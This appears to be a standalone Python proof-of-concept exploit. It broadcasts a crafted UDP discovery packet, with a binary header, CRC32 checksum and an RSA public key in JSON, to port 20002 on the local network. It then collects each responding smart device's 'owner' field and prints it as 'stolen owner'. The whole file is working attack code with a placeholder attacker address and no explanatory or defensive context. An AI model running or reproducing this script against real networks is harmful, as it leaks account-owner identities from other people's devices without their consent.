from random import randrange
from zlib import crc32
from Crypto.PublicKey import RSA
import json

def getBroadcastPayload():
    key=RSA.generate(2048).publickey().exportKey('PEM')
    payload={"params":{"rsa_key": key.decode('utf-8')}}
    JSONPayload=json.dumps(payload,separators=(',', ':'))
    fixedBytes = b'\x02\x00\x00\x01\x00\x00\x11\x00\x00\x00\x00\x00Zk|\x8d'
    result = bytearray(fixedBytes + JSONPayload.encode('utf-8'))
    result[4:6] = len(JSONPayload).to_bytes(2, 'big')
    result[8:12] = randrange(100000).to_bytes(4, 'big')
    result[12:16] = crc32(result).to_bytes(4, 'big')
    return bytes(result)




import socket

attackerIP = "IP_ADDRESS_ATTACKER"
attackerPort = 53353
bufferSize = 2048

UDPServerSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
UDPServerSocket.bind((attackerIP, attackerPort))
UDPServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

devicesAddressPort= ("255.255.255.255", 20002)
bytesToSend = getBroadcastPayload()
UDPServerSocket.sendto(bytesToSend, devicesAddressPort)

while (True):
    bytesAddressPair = UDPServerSocket.recvfrom(bufferSize)
    message = bytesAddressPair[0]
    OWNER=json.loads(message[16:].decode())["result"]["owner"]
    print('stolen owner='+OWNER)
